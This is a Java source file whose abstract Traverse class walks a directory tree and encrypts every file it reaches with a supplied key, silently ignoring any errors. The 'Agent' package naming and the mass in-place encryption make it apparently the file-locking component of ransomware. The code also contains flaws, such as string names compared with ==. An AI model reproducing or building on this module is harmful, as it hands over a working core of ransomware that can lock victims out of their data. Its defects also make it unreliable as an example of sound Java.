package Agent.traversal;

import java.io.File;
import java.util.Collection;
import Agent.EncryptionAlgo.JavaCryptoUtil;
import Agent.entites.CryptoKey;
import Agent.exceptions.CryptoException;

public abstract class Traverse {

	public boolean compareFolders(File file1, File file2) {
		return (file1.getName() == file2.getName());
	}

	// Check if specific directory is already found in the folder tree
	private boolean isVisitedFolder(File file, Collection<File> folderTree) {
		if (folderTree == null) {
			return false;
		}

		else {
			boolean isExist = false;
			String tocheck = file.getName();
			isExist = folderTree.stream().anyMatch(t -> t.getName() == tocheck);
			return isExist;
		}

	}

	public void traverseAndEncrypt(String inputDir, Collection<File> dirs, CryptoKey key) {

		add(new File(inputDir));
		while (!(isEmpty())) {
			/* get next file/directory */
			File current = remove();

			File[] fileDirList = current.listFiles();

			if (fileDirList != null) {
				for (File file : fileDirList) {
					if (file.isDirectory()) {
						try {

							if (!(isVisitedFolder(file, dirs))) {

								dirs.add(file);

							}
						} catch (NullPointerException e) {

						}
						add(file);

					} else if (file.isFile()) {
						JavaCryptoUtil crypto = new JavaCryptoUtil();
						try {
							crypto.encrypt(key.getKey(), file, key.getAlgorithm());
						} catch (CryptoException e) {

						}
					}
				}

			}
		}
	}

	public abstract <T> void add(T file);

	public abstract <T> T remove();

	public abstract boolean isEmpty();

}
